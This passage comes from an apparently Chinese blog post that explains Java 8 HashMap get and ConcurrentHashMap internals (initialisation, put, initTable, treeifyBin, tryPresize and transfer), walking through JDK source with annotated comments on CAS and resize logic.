</pre><h4 id="get-过程分析-2"><a href="#get-过程分析-2" class="headerlink" title="get 过程分析"></a>get 过程分析</h4><p>相对于 put 来说，get 真的太简单了。</p><ol><li>计算 key 的 hash 值，根据 hash 值找到对应数组下标: hash &amp; (length-1)</li><li>判断数组该位置处的元素是否刚好就是我们要找的，如果不是，走第三步</li><li>判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据，如果不是，走第四步</li><li>遍历链表，直到找到相等(&#x3D;&#x3D;或equals)的 key.</li></ol><pre class="line-numbers language-none"><code class="language-none">public V get(Object key) &#123;    Node&lt;K,V&gt; e;    return (e &#x3D; getNode(hash(key), key)) &#x3D;&#x3D; null ? null : e.value;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">final Node&lt;K,V&gt; getNode(int hash, Object key) &#123;    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k;    if ((tab &#x3D; table) !&#x3D; null &amp;&amp; (n &#x3D; tab.length) &gt; 0 &amp;&amp;        (first &#x3D; tab[(n - 1) &amp; hash]) !&#x3D; null) &#123;        &#x2F;&#x2F; 判断第一个节点是不是就是需要的        if (first.hash &#x3D;&#x3D; hash &amp;&amp; &#x2F;&#x2F; always check first node            ((k &#x3D; first.key) &#x3D;&#x3D; key || (key !&#x3D; null &amp;&amp; key.equals(k))))            return first;        if ((e &#x3D; first.next) !&#x3D; null) &#123;            &#x2F;&#x2F; 判断是否是红黑树            if (first instanceof TreeNode)                return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);             &#x2F;&#x2F; 链表遍历            do &#123;                if (e.hash &#x3D;&#x3D; hash &amp;&amp;                    ((k &#x3D; e.key) &#x3D;&#x3D; key || (key !&#x3D; null &amp;&amp; key.equals(k))))                    return e;            &#125; while ((e &#x3D; e.next) !&#x3D; null);        &#125;    &#125;    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java8-ConcurrentHashMap"><a href="#Java8-ConcurrentHashMap" class="headerlink" title="Java8 ConcurrentHashMap"></a>Java8 ConcurrentHashMap</h2><p>Java7 中实现的 ConcurrentHashMap 说实话还是比较复杂的，Java8 对 ConcurrentHashMap 进行了比较大的改动。建议读者可以参考 Java8 中 HashMap 相对于 Java7 HashMap 的改动，对于 ConcurrentHashMap，Java8 也引入了红黑树。</p><p>说实话，Java8 ConcurrentHashMap 源码真心不简单，最难的在于扩容，数据迁移操作不容易看懂。</p><p>我们先用一个示意图来描述下其结构：</p><p><img src="http://qianniu.javastack.cn/18-12-4/335817.jpg"></p><p>结构上和 Java8 的 HashMap 基本上一样，不过它要保证线程安全性，所以在源码上确实要复杂一些。推荐阅读：<a href="https://mp.weixin.qq.com/s/5Y5_6qn2g6kIVmQia_0R6g">几种线程安全的Map解析</a>。</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 这构造函数里，什么都不干public ConcurrentHashMap() &#123;&#125;public ConcurrentHashMap(int initialCapacity) &#123;    if (initialCapacity &lt; 0)        throw new IllegalArgumentException();    int cap &#x3D; ((initialCapacity &gt;&#x3D; (MAXIMUM_CAPACITY &gt;&gt;&gt; 1)) ?               MAXIMUM_CAPACITY :               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; 1) + 1));    this.sizeCtl &#x3D; cap;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个初始化方法有点意思，通过提供初始容量，计算了 sizeCtl，sizeCtl &#x3D; 【 (1.5 * initialCapacity + 1)，然后向上取最近的 2 的 n 次方】。如 initialCapacity 为 10，那么得到 sizeCtl 为 16，如果 initialCapacity 为 11，得到 sizeCtl 为 32。</p><p>sizeCtl 这个属性使用的场景很多，不过只要跟着文章的思路来，就不会被它搞晕了。</p><p>如果你爱折腾，也可以看下另一个有三个参数的构造方法，这里我就不说了，大部分时候，我们会使用无参构造函数进行实例化，我们也按照这个思路来进行源码分析吧。</p><h4 id="put-过程分析-3"><a href="#put-过程分析-3" class="headerlink" title="put 过程分析"></a>put 过程分析</h4><p>仔细地一行一行代码看下去：</p><pre class="line-numbers language-none"><code class="language-none">public V put(K key, V value) &#123;    return putVal(key, value, false);&#125;final V putVal(K key, V value, boolean onlyIfAbsent) &#123;    if (key &#x3D;&#x3D; null || value &#x3D;&#x3D; null) throw new NullPointerException();    &#x2F;&#x2F; 得到 hash 值    int hash &#x3D; spread(key.hashCode());    &#x2F;&#x2F; 用于记录相应链表的长度    int binCount &#x3D; 0;    for (Node&lt;K,V&gt;[] tab &#x3D; table;;) &#123;        Node&lt;K,V&gt; f; int n, i, fh;        &#x2F;&#x2F; 如果数组&quot;空&quot;，进行数组初始化        if (tab &#x3D;&#x3D; null || (n &#x3D; tab.length) &#x3D;&#x3D; 0)            &#x2F;&#x2F; 初始化数组，后面会详细介绍            tab &#x3D; initTable();         &#x2F;&#x2F; 找该 hash 值对应的数组下标，得到第一个节点 f        else if ((f &#x3D; tabAt(tab, i &#x3D; (n - 1) &amp; hash)) &#x3D;&#x3D; null) &#123;            &#x2F;&#x2F; 如果数组该位置为空，            &#x2F;&#x2F;    用一次 CAS 操作将这个新值放入其中即可，这个 put 操作差不多就结束了，可以拉到最后面了            &#x2F;&#x2F;          如果 CAS 失败，那就是有并发操作，进到下一个循环就好了            if (casTabAt(tab, i, null,                         new Node&lt;K,V&gt;(hash, key, value, null)))                break;                   &#x2F;&#x2F; no lock when adding to empty bin        &#125;        &#x2F;&#x2F; hash 居然可以等于 MOVED，这个需要到后面才能看明白，不过从名字上也能猜到，肯定是因为在扩容        else if ((fh &#x3D; f.hash) &#x3D;&#x3D; MOVED)            &#x2F;&#x2F; 帮助数据迁移，这个等到看完数据迁移部分的介绍后，再理解这个就很简单了            tab &#x3D; helpTransfer(tab, f);         else &#123; &#x2F;&#x2F; 到这里就是说，f 是该位置的头结点，而且不为空             V oldVal &#x3D; null;            &#x2F;&#x2F; 获取数组该位置的头结点的监视器锁            synchronized (f) &#123;                if (tabAt(tab, i) &#x3D;&#x3D; f) &#123;                    if (fh &gt;&#x3D; 0) &#123; &#x2F;&#x2F; 头结点的 hash 值大于 0，说明是链表                        &#x2F;&#x2F; 用于累加，记录链表的长度                        binCount &#x3D; 1;                        &#x2F;&#x2F; 遍历链表                        for (Node&lt;K,V&gt; e &#x3D; f;; ++binCount) &#123;                            K ek;                            &#x2F;&#x2F; 如果发现了&quot;相等&quot;的 key，判断是否要进行值覆盖，然后也就可以 break 了                            if (e.hash &#x3D;&#x3D; hash &amp;&amp;                                ((ek &#x3D; e.key) &#x3D;&#x3D; key ||                                 (ek !&#x3D; null &amp;&amp; key.equals(ek)))) &#123;                                oldVal &#x3D; e.val;                                if (!onlyIfAbsent)                                    e.val &#x3D; value;                                break;                            &#125;                            &#x2F;&#x2F; 到了链表的最末端，将这个新值放到链表的最后面                            Node&lt;K,V&gt; pred &#x3D; e;                            if ((e &#x3D; e.next) &#x3D;&#x3D; null) &#123;                                pred.next &#x3D; new Node&lt;K,V&gt;(hash, key,                                                          value, null);                                break;                            &#125;                        &#125;                    &#125;                    else if (f instanceof TreeBin) &#123; &#x2F;&#x2F; 红黑树                        Node&lt;K,V&gt; p;                        binCount &#x3D; 2;                        &#x2F;&#x2F; 调用红黑树的插值方法插入新节点                        if ((p &#x3D; ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,                                                       value)) !&#x3D; null) &#123;                            oldVal &#x3D; p.val;                            if (!onlyIfAbsent)                                p.val &#x3D; value;                        &#125;                    &#125;                &#125;            &#125;            &#x2F;&#x2F; binCount !&#x3D; 0 说明上面在做链表操作            if (binCount !&#x3D; 0) &#123;                &#x2F;&#x2F; 判断是否要将链表转换为红黑树，临界值和 HashMap 一样，也是 8                if (binCount &gt;&#x3D; TREEIFY_THRESHOLD)                    &#x2F;&#x2F; 这个方法和 HashMap 中稍微有一点点不同，那就是它不是一定会进行红黑树转换，                    &#x2F;&#x2F; 如果当前数组的长度小于 64，那么会选择进行数组扩容，而不是转换为红黑树                    &#x2F;&#x2F;    具体源码我们就不看了，扩容部分后面说                    treeifyBin(tab, i);                if (oldVal !&#x3D; null)                    return oldVal;                break;            &#125;        &#125;    &#125;    &#x2F;&#x2F;     addCount(1L, binCount);    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>put 的主流程看完了，但是至少留下了几个问题，第一个是初始化，第二个是扩容，第三个是帮助数据迁移，这些我们都会在后面进行一一介绍。</p><h6 id="初始化数组：initTable"><a href="#初始化数组：initTable" class="headerlink" title="初始化数组：initTable"></a>初始化数组：initTable</h6><p>这个比较简单，主要就是初始化一个合适大小的数组，然后会设置 sizeCtl。</p><p>初始化方法中的并发问题是通过对 sizeCtl 进行一个 CAS 操作来控制的。</p><pre class="line-numbers language-none"><code class="language-none">private final Node&lt;K,V&gt;[] initTable() &#123;    Node&lt;K,V&gt;[] tab; int sc;    while ((tab &#x3D; table) &#x3D;&#x3D; null || tab.length &#x3D;&#x3D; 0) &#123;        &#x2F;&#x2F; 初始化的&quot;功劳&quot;被其他线程&quot;抢去&quot;了        if ((sc &#x3D; sizeCtl) &lt; 0)            Thread.yield(); &#x2F;&#x2F; lost initialization race; just spin        &#x2F;&#x2F; CAS 一下，将 sizeCtl 设置为 -1，代表抢到了锁        else if (U.compareAndSwapInt(this, SIZECTL, sc, -1)) &#123;            try &#123;                if ((tab &#x3D; table) &#x3D;&#x3D; null || tab.length &#x3D;&#x3D; 0) &#123;                    &#x2F;&#x2F; DEFAULT_CAPACITY 默认初始容量是 16                    int n &#x3D; (sc &gt; 0) ? sc : DEFAULT_CAPACITY;                    &#x2F;&#x2F; 初始化数组，长度为 16 或初始化时提供的长度                    Node&lt;K,V&gt;[] nt &#x3D; (Node&lt;K,V&gt;[])new Node&lt;?,?&gt;[n];                    &#x2F;&#x2F; 将这个数组赋值给 table，table 是 volatile 的                    table &#x3D; tab &#x3D; nt;                    &#x2F;&#x2F; 如果 n 为 16 的话，那么这里 sc &#x3D; 12                    &#x2F;&#x2F; 其实就是 0.75 * n                    sc &#x3D; n - (n &gt;&gt;&gt; 2);                &#125;            &#125; finally &#123;                &#x2F;&#x2F; 设置 sizeCtl 为 sc，我们就当是 12 吧                sizeCtl &#x3D; sc;            &#125;            break;        &#125;    &#125;    return tab;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="链表转红黑树-treeifyBin"><a href="#链表转红黑树-treeifyBin" class="headerlink" title="链表转红黑树: treeifyBin"></a>链表转红黑树: treeifyBin</h6><p>前面我们在 put 源码分析也说过，treeifyBin 不一定就会进行红黑树转换，也可能是仅仅做数组扩容。我们还是进行源码分析吧。</p><pre class="line-numbers language-none"><code class="language-none">private final void treeifyBin(Node&lt;K,V&gt;[] tab, int index) &#123;    Node&lt;K,V&gt; b; int n, sc;    if (tab !&#x3D; null) &#123;        &#x2F;&#x2F; MIN_TREEIFY_CAPACITY 为 64        &#x2F;&#x2F; 所以，如果数组长度小于 64 的时候，其实也就是 32 或者 16 或者更小的时候，会进行数组扩容        if ((n &#x3D; tab.length) &lt; MIN_TREEIFY_CAPACITY)            &#x2F;&#x2F; 后面我们再详细分析这个方法            tryPresize(n &lt;&lt; 1);        &#x2F;&#x2F; b 是头结点        else if ((b &#x3D; tabAt(tab, index)) !&#x3D; null &amp;&amp; b.hash &gt;&#x3D; 0) &#123;            &#x2F;&#x2F; 加锁            synchronized (b) &#123;                 if (tabAt(tab, index) &#x3D;&#x3D; b) &#123;                    &#x2F;&#x2F; 下面就是遍历链表，建立一颗红黑树                    TreeNode&lt;K,V&gt; hd &#x3D; null, tl &#x3D; null;                    for (Node&lt;K,V&gt; e &#x3D; b; e !&#x3D; null; e &#x3D; e.next) &#123;                        TreeNode&lt;K,V&gt; p &#x3D;                            new TreeNode&lt;K,V&gt;(e.hash, e.key, e.val,                                              null, null);                        if ((p.prev &#x3D; tl) &#x3D;&#x3D; null)                            hd &#x3D; p;                        else                            tl.next &#x3D; p;                        tl &#x3D; p;                    &#125;                    &#x2F;&#x2F; 将红黑树设置到数组相应位置中                    setTabAt(tab, index, new TreeBin&lt;K,V&gt;(hd));                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="扩容：tryPresize"><a href="#扩容：tryPresize" class="headerlink" title="扩容：tryPresize"></a>扩容：tryPresize</h4><p>如果说 Java8 ConcurrentHashMap 的源码不简单，那么说的就是扩容操作和迁移操作。</p><p>这个方法要完完全全看懂还需要看之后的 transfer 方法，读者应该提前知道这点。</p><p>这里的扩容也是做翻倍扩容的，扩容后数组容量为原来的 2 倍。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 首先要说明的是，方法参数 size 传进来的时候就已经翻了倍了private final void tryPresize(int size) &#123;    &#x2F;&#x2F; c：size 的 1.5 倍，再加 1，再往上取最近的 2 的 n 次方。    int c &#x3D; (size &gt;&#x3D; (MAXIMUM_CAPACITY &gt;&gt;&gt; 1)) ? MAXIMUM_CAPACITY :        tableSizeFor(size + (size &gt;&gt;&gt; 1) + 1);    int sc;    while ((sc &#x3D; sizeCtl) &gt;&#x3D; 0) &#123;        Node&lt;K,V&gt;[] tab &#x3D; table; int n;         &#x2F;&#x2F; 这个 if 分支和之前说的初始化数组的代码基本上是一样的，在这里，我们可以不用管这块代码        if (tab &#x3D;&#x3D; null || (n &#x3D; tab.length) &#x3D;&#x3D; 0) &#123;            n &#x3D; (sc &gt; c) ? sc : c;            if (U.compareAndSwapInt(this, SIZECTL, sc, -1)) &#123;                try &#123;                    if (table &#x3D;&#x3D; tab) &#123;                        @SuppressWarnings(&quot;unchecked&quot;)                        Node&lt;K,V&gt;[] nt &#x3D; (Node&lt;K,V&gt;[])new Node&lt;?,?&gt;[n];                        table &#x3D; nt;                        sc &#x3D; n - (n &gt;&gt;&gt; 2); &#x2F;&#x2F; 0.75 * n                    &#125;                &#125; finally &#123;                    sizeCtl &#x3D; sc;                &#125;            &#125;        &#125;        else if (c &lt;&#x3D; sc || n &gt;&#x3D; MAXIMUM_CAPACITY)            break;        else if (tab &#x3D;&#x3D; table) &#123;            &#x2F;&#x2F; 我没看懂 rs 的真正含义是什么，不过也关系不大            int rs &#x3D; resizeStamp(n);             if (sc &lt; 0) &#123;                Node&lt;K,V&gt;[] nt;                if ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) !&#x3D; rs || sc &#x3D;&#x3D; rs + 1 ||                    sc &#x3D;&#x3D; rs + MAX_RESIZERS || (nt &#x3D; nextTable) &#x3D;&#x3D; null ||                    transferIndex &lt;&#x3D; 0)                    break;                &#x2F;&#x2F; 2. 用 CAS 将 sizeCtl 加 1，然后执行 transfer 方法                &#x2F;&#x2F;    此时 nextTab 不为 null                if (U.compareAndSwapInt(this, SIZECTL, sc, sc + 1))                    transfer(tab, nt);            &#125;            &#x2F;&#x2F; 1. 将 sizeCtl 设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2)            &#x2F;&#x2F;     我是没看懂这个值真正的意义是什么？不过可以计算出来的是，结果是一个比较大的负数            &#x2F;&#x2F;  调用 transfer 方法，此时 nextTab 参数为 null            else if (U.compareAndSwapInt(this, SIZECTL, sc,                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2))                transfer(tab, null);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法的核心在于 sizeCtl 值的操作，首先将其设置为一个负数，然后执行 transfer(tab, null)，再下一个循环将 sizeCtl 加 1，并执行 transfer(tab, nt)，之后可能是继续 sizeCtl 加 1，并执行 transfer(tab, nt)。</p><p>所以，可能的操作就是执行 **1 次 transfer(tab, null) + 多次 transfer(tab, nt)**，这里怎么结束循环的需要看完 transfer 源码才清楚。推荐阅读：<a href="https://mp.weixin.qq.com/s/Q5F604CUM_0x2co9mvADxw">30 个 Java 集合面试问题及答案</a>。</p><h6 id="数据迁移：transfer"><a href="#数据迁移：transfer" class="headerlink" title="数据迁移：transfer"></a>数据迁移：transfer</h6><p>下面这个方法很点长，将原来的 tab 数组的元素迁移到新的 nextTab 数组中。</p><p>虽然我们之前说的 tryPresize 方法中多次调用 transfer 不涉及多线程，但是这个 transfer 方法可以在其他地方被调用，典型地，我们之前在说 put 方法的时候就说过了，请往上看 put 方法，是不是有个地方调用了 helpTransfer 方法，helpTransfer 方法会调用 transfer 方法的。</p><p>此方法支持多线程执行，外围调用此方法的时候，会保证第一个发起数据迁移的线程，nextTab 参数为 null，之后再调用此方法的时候，nextTab 不会为 null。</p><p>阅读源码之前，先要理解并发操作的机制。原数组长度为 n，所以我们有 n 个迁移任务，让每个线程每次负责一个小任务是最简单的，每做完一个任务再检测是否有其他没做完的任务，帮助迁移就可以了，而 Doug Lea 使用了一个 stride，简单理解就是步长，每个线程每次负责迁移其中的一部分，如每次迁移 16 个小任务。所以，我们就需要一个全局的调度者来安排哪个线程执行哪几个任务，这个就是属性 transferIndex 的作用。</p><p>第一个发起数据迁移的线程会将 transferIndex 指向原数组最后的位置，然后从后往前的 stride 个任务属于第一个线程，然后将 transferIndex 指向新的位置，再往前的 stride 个任务属于第二个线程，依此类推。当然，这里说的第二个线程不是真的一定指代了第二个线程，也可以是同一个线程，这个读者应该能理解吧。其实就是将一个大的迁移任务分为了一个个任务包。</p><pre class="line-numbers language-none"><code class="language-none">private final void transfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab) &#123;    int n &#x3D; tab.length, stride;     &#x2F;&#x2F; stride 在单核下直接等于 n，多核模式下为 (n&gt;&gt;&gt;3)&#x2F;NCPU，最小值是 16    &#x2F;&#x2F; stride 可以理解为”步长“，有 n 个位置是需要进行迁移的，    &#x2F;&#x2F;   将这 n 个任务分为多个任务包，每个任务包有 stride 个任务    if ((stride &#x3D; (NCPU &gt; 1) ? (n &gt;&gt;&gt; 3) &#x2F; NCPU : n) &lt; MIN_TRANSFER_STRIDE)        stride &#x3D; MIN_TRANSFER_STRIDE; &#x2F;&#x2F; subdivide range     &#x2F;&#x2F; 如果 nextTab 为 null，先进行一次初始化    &#x2F;&#x2F;    前面我们说了，外围会保证第一个发起迁移的线程调用此方法时，参数 nextTab 为 null    &#x2F;&#x2F;       之后参与迁移的线程调用此方法时，nextTab 不会为 null    if (nextTab &#x3D;&#x3D; null) &#123;        try &#123;            &#x2F;&#x2F; 容量翻倍            Node&lt;K,V&gt;[] nt &#x3D; (Node&lt;K,V&gt;[])new Node&lt;?,?&gt;[n &lt;&lt; 1];            nextTab &#x3D; nt;        &#125; catch (Throwable ex) &#123;      &#x2F;&#x2F; try to cope with OOME            sizeCtl &#x3D; Integer.MAX_VALUE;            return;        &#125;        &#x2F;&#x2F; nextTable 是 ConcurrentHashMap 中的属性        nextTable &#x3D; nextTab;        &#x2F;&#x2F; transferIndex 也是 ConcurrentHashMap 的属性，用于控制迁移的位置        transferIndex &#x3D; n;    &#125;     int nextn &#x3D; nextTab.length;     &#x2F;&#x2F; ForwardingNode 翻译过来就是正在被迁移的 Node    &#x2F;&#x2F; 这个构造方法会生成一个Node，key、value 和 next 都为 null，关键是 hash 为 MOVED    &#x2F;&#x2F; 后面我们会看到，原数组中位置 i 处的节点完成迁移工作后，    &#x2F;&#x2F;    就会将位置 i 处设置为这个 ForwardingNode，用来告诉其他线程该位置已经处理过了    &#x2F;&#x2F;    所以它其实相当于是一个标志。    ForwardingNode&lt;K,V&gt; fwd &#x3D; new ForwardingNode&lt;K,V&gt;(nextTab);      &#x2F;&#x2F; advance 指的是做完了一个位置的迁移工作，可以准备做下一个位置的了    boolean advance &#x3D; true;    boolean finishing &#x3D; false; &#x2F;&#x2F; to ensure sweep before committing nextTab     &#x2F;*     * 下面这个 for 循环，最难理解的在前面，而要看懂它们，应该先看懂后面的，然后再倒回来看     *      *&#x2F;     &#x2F;&#x2F; i 是位置索引，bound 是边界，注意是从后往前    for (int i &#x3D; 0, bound &#x3D; 0;;) &#123;        Node&lt;K,V&gt; f; int fh;         &#x2F;&#x2F; 下面这个 while 真的是不好理解        &#x2F;&#x2F; advance 为 true 表示可以进行下一个位置的迁移了        &#x2F;&#x2F;   简单理解结局：i 指向了 transferIndex，bound 指向了 transferIndex-stride        while (advance) &#123;            int nextIndex, nextBound;            if (--i &gt;&#x3D; bound || finishing)                advance &#x3D; false;             &#x2F;&#x2F; 将 transferIndex 值赋给 nextIndex            &#x2F;&#x2F; 这里 transferIndex 一旦小于等于 0，说明原数组的所有位置都有相应的线程去处理了            else if ((nextIndex &#x3D; transferIndex) &lt;&#x3D; 0) &#123;                i &#x3D; -1;                advance &#x3D; false;            &#125;            else if (U.compareAndSwapInt                     (this, TRANSFERINDEX, nextIndex,                      nextBound &#x3D; (nextIndex &gt; stride ?                                   nextIndex - stride : 0))) &#123;                &#x2F;&#x2F; 看括号中的代码，nextBound 是这次迁移任务的边界，注意，是从后往前                bound &#x3D; nextBound;                i &#x3D; nextIndex - 1;                advance &#x3D; false;            &#125;        &#125;        if (i &lt; 0 || i &gt;&#x3D; n || i + n &gt;&#x3D; nextn) &#123;            int sc;            if (finishing) &#123;                &#x2F;&#x2F; 所有的迁移操作已经完成                nextTable &#x3D; null;                &#x2F;&#x2F; 将新的 nextTab 赋值给 table 属性，完成迁移                table &#x3D; nextTab;                &#x2F;&#x2F; 重新计算 sizeCtl：n 是原数组长度，所以 sizeCtl 得出的值将是新数组长度的 0.75 倍                sizeCtl &#x3D; (n &lt;&lt; 1) - (n &gt;&gt;&gt; 1);                return;            &#125;             &#x2F;&#x2F; 之前我们说过，sizeCtl 在迁移前会设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2            &#x2F;&#x2F; 然后，每有一个线程参与迁移就会将 sizeCtl 加 1，            &#x2F;&#x2F; 这里使用 CAS 操作对 sizeCtl 进行减 1，代表做完了属于自己的任务            if (U.compareAndSwapInt(this, SIZECTL, sc &#x3D; sizeCtl, sc - 1)) &#123;                &#x2F;&#x2F; 任务结束，方法退出                if ((sc - 2) !&#x3D; resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT)                    return;                 &#x2F;&#x2F; 到这里，说明 (sc - 2) &#x3D;&#x3D; resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT，                &#x2F;&#x2F; 也就是说，所有的迁移任务都做完了，也就会进入到上面的 if(finishing)&#123;&#125; 分支了                finishing &#x3D; advance &#x3D; true;                i &#x3D; n; &#x2F;&#x2F; recheck before commit            &#125;        &#125;        &#x2F;&#x2F; 如果位置 i 处是空的，没有任何节点，那么放入刚刚初始化的 ForwardingNode ”空节点“        else if ((f &#x3D; tabAt(tab, i)) &#x3D;&#x3D; null)            advance &#x3D; casTabAt(tab, i, null, fwd);        &#x2F;&#x2F; 该位置处是一个 ForwardingNode，代表该位置已经迁移过了        else if ((fh &#x3D; f.hash) &#x3D;&#x3D; MOVED)            advance &#x3D; true; &#x2F;&#x2F; already processed        else &#123;            &#x2F;&#x2F; 对数组该位置处的结点加锁，开始处理数组该位置处的迁移工作            synchronized (f) &#123;                if (tabAt(tab, i) &#x3D;&#x3D; f) &#123;                    Node&lt;K,V&gt; ln, hn;                    &#x2F;&#x2F; 头结点的 hash 大于 0，说明是链表的 Node 节点                    if (fh &gt;&#x3D; 0) &#123;                        &#x2F;&#x2F; 下面这一块和 Java7 中的 ConcurrentHashMap 迁移是差不多的，                        &#x2F;&#x2F; 需要将链表一分为二，                        &#x2F;&#x2F;   找到原链表中的 lastRun，然后 lastRun 及其之后的节点是一起进行迁移的                        &#x2F;&#x2F;   lastRun 之前的节点需要进行克隆，然后分到两个链表中                        int runBit &#x3D; fh &amp; n;                        Node&lt;K,V&gt; lastRun &#x3D; f;                        for (Node&lt;K,V&gt; p &#x3D; f.next; p !&#x3D; null; p &#x3D; p.next) &#123;                            int b &#x3D; p.hash &amp; n;                            if (b !&#x3D; runBit) &#123;                                runBit &#x3D; b;                                lastRun &#x3D; p;                            &#125;                        &#125;                        if (runBit &#x3D;&#x3D; 0) &#123;                            ln &#x3D; lastRun;                            hn &#x3D; null;                        &#125;                        else &#123;                            hn &#x3D; lastRun;                            ln &#x3D; null;                        &#125;                        for (Node&lt;K,V&gt; p &#x3D; f; p !&#x3D; lastRun; p &#x3D; p.next) &#123;                            int ph &#x3D; p.hash; K pk &#x3D; p.key; V pv &#x3D; p.val;                            if ((ph &amp; n) &#x3D;&#x3D; 0)                                ln &#x3D; new Node&lt;K,V&gt;(ph, pk, pv, ln);                            else                                hn &#x3D; new Node&lt;K,V&gt;(ph, pk, pv, hn);                        &#125;                        &#x2F;&#x2F; 其中的一个链表放在新数组的位置 i                        setTabAt(nextTab, i, ln);                        &#x2F;&#x2F; 另一个链表放在新数组的位置 i+n                        setTabAt(nextTab, i + n, hn);                        &#x2F;&#x2F; 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，                        &#x2F;&#x2F;    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了                        setTabAt(tab, i, fwd);                        &#x2F;&#x2F; advance 设置为 true，代表该位置已经迁移完毕                        advance &#x3D; true;                    &#125;                    else if (f instanceof TreeBin) &#123;                        &#x2F;&#x2F; 红黑树的迁移                        TreeBin&lt;K,V&gt; t &#x3D; (TreeBin&lt;K,V&gt;)f;                        TreeNode&lt;K,V&gt; lo &#x3D; null, loTail &#x3D; null;                        TreeNode&lt;K,V&gt; hi &#x3D; null, hiTail &#x3D; null;                        int lc &#x3D; 0, hc &#x3D; 0;                        for (Node&lt;K,V&gt; e &#x3D; t.first; e !&#x3D; null; e &#x3D; e.next) &#123;                            int h &#x3D; e.hash;                            TreeNode&lt;K,V&gt; p &#x3D; new TreeNode&lt;K,V&gt;                                (h, e.key, e.val, null, null);                            if ((h &amp; n) &#x3D;&#x3D; 0) &#123;                                if ((p.prev &#x3D; loTail) &#x3D;&#x3D; null)                                    lo &#x3D; p;                                else                                    loTail.next &#x3D; p;                                loTail &#x3D; p;                                ++lc;                            &#125;                            else &#123;                                if ((p.prev &#x3D; hiTail) &#x3D;&#x3D; null)                                    hi &#x3D; p;                                else                                    hiTail.next &#x3D; p;                                hiTail &#x3D; p;                                ++hc;                            &#125;                        &#125;                        &#x2F;&#x2F; 如果一分为二后，节点数少于 8，那么将红黑树转换回链表                        ln &#x3D; (lc &lt;&#x3D; UNTREEIFY_THRESHOLD) ? untreeify(lo) :                            (hc !&#x3D; 0) ? new TreeBin&lt;K,V&gt;(lo) : t;                        hn &#x3D; (hc &lt;&#x3D; UNTREEIFY_THRESHOLD) ? untreeify(hi) :                            (lc !&#x3D; 0) ? new TreeBin&lt;K,V&gt;(hi) : t;                         &#x2F;&#x2F; 将 ln 放置在新数组的位置 i                        setTabAt(nextTab, i, ln);                        &#x2F;&#x2F; 将 hn 放置在新数组的位置 i+n                        setTabAt(nextTab, i + n, hn);                        &#x2F;&#x2F; 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，                        &#x2F;&#x2F;    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了                        setTabAt(tab, i, fwd);                        &#x2F;&#x2F; advance 设置为 true，代表该位置已经迁移完毕                        advance &#x3D; true;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" 